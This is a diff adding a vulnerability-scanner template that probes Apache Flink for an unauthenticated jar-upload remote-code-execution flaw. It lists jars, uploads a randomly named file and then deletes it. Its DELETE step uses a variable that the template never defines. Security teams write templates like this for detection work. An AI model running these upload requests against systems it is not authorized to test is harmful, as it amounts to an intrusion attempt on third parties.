@@ -1,0 +1,59 @@
+id: poc-yaml-apache-flink-upload-rce
+
+info:
+  name: poc-yaml-apache-flink-upload-rce
+  author: timwhite
+  severity: high
+  tags: xray-converted,rce,fileupload,ct-158117
+  reference:
+    - https://github.com/LandGrey/flink-unauth-rce
+
+http:
+  - raw:
+      - |
+        GET /jars HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "address"
+          - "files"
+  - raw:
+      - |
+        POST /jars/upload HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data;boundary=8ce4b16b22b58894aa86c421e8759df3
+
+        --8ce4b16b22b58894aa86c421e8759df3
+        Content-Disposition: form-data; name="jarfile";filename="{{rand_base(8)}}.jar"
+        Content-Type:application/octet-stream
+        
+        {{rand_base(8)}}
+        --8ce4b16b22b58894aa86c421e8759df3--
+        
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "success"
+  - raw:
+      - |
+        DELETE /jars/{{filen}} HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
